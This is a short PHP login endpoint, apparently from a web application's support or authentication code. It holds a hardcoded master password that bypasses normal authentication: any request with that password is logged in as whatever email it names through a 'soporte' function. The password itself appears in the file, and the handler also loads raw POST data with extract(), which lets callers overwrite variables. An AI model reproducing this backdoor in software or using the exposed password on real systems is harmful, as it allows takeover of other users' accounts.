<?php
    include '../includes/config.php';
    extract($_POST);
    if($password === "S0p0r73w3p3tOblicua"){
        $userLogin = $wp->user_soporte(strtolower($email));
    }else{
        $userLogin = $wp->user_login(strtolower($email), $password);
    }
    echo json_encode($userLogin);